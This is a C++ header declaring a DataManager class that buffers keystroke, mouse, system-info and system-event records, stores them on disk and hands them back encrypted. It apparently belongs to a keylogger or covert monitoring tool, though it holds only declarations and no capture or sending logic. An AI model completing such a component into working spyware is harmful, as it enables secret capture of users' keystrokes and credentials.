#ifndef DATAMANAGER_H
#define DATAMANAGER_H

#include "data/KeyData.h"
#include "data/SystemData.h"
#include <string>
#include <vector>
#include <mutex>

struct MouseData;
struct SystemEventData;

class Configuration;

class DataManager {
public:
    explicit DataManager(Configuration* config);
    ~DataManager();
    
    void AddKeyData(const KeyData& keyData);
    void AddMouseData(const MouseData& mouseData);
    void AddSystemData(const SystemInfo& systemInfo);
    void AddSystemEventData(const SystemEventData& eventData);
    
    std::vector<uint8_t> RetrieveEncryptedData();
    void ClearData();
    bool HasData() const;
    
private:
    Configuration* m_config;
    std::wstring m_storagePath;
    size_t m_maxBufferSize;
    
    mutable std::mutex m_dataMutex;
    std::string m_keyDataBuffer;
    std::string m_mouseDataBuffer;
    std::string m_systemDataBuffer;
    std::string m_systemEventBuffer;
    
    void InitializeStorage();
    void FlushAllData();
    void FlushKeyData();
    void FlushMouseData();
    void FlushSystemData();
    void FlushSystemEvents();
    void AppendToStorage(const std::string& data);
    
    std::string KeyDataToString(const KeyData& data) const;
    std::string MouseDataToString(const MouseData& data) const;
    std::string SystemInfoToString(const SystemInfo& info) const;
    std::string SystemEventToString(const SystemEventData& event) const;
};

#endif